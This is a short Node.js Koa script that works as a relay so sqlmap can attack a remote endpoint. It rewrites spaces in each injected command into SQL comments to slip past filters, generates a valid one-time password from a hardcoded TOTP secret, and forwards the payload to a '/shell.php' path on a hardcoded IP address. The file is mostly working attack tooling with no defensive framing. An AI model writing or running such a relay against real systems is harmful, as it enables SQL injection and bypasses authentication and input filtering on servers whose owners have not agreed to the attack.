const Koa = require('koa');
const http = require('http');
const querystring = require('querystring');
const TOTP = require('totp.js');
/**
 * yarn add totp.js
 */

const app = new Koa();
const totp = new TOTP("GAXG24JTMZXGKZBU", 8);

function fuck(param) {
    let promise = new Promise(function(resolve, rejecte) {
        data = {
            a: param,
            totp: totp.genOTP(5)
        }
        var content = querystring.stringify(data);
        var options = {
            hostname: '222.85.25.41',
            port: 8090,
            path: '/shell.php?' + content,
            method: 'GET'
        };
        var req = http.request(options, (res) => {
            res.setEncoding('utf8');
            let rawData = '';
            res.on('data', (chunk) => {
                rawData += chunk;
            });
            res.on('end', () => {
                resolve(rawData)
            });
        });
        req.on('error', function(e) {
            console.log('problem with request: ' + e.message);
            rejecte(e.message)
        });
        req.end();
    })
    return promise;
}

/**
 * Web 中转 For Sqlmap
 */

app.use(async ctx => {
    let query = ctx.query || ctx.request.query;
    var resp = ''
    if (query.cmd) {
        var cmd = query.cmd.replace(/ /g, "/**/");
        resp = await fuck(`login ${cmd} 123456`)
        console.log(resp)
    }
    ctx.body = JSON.stringify(resp);
});

console.log("Listening http://127.0.0.1:3000")
app.listen(3000);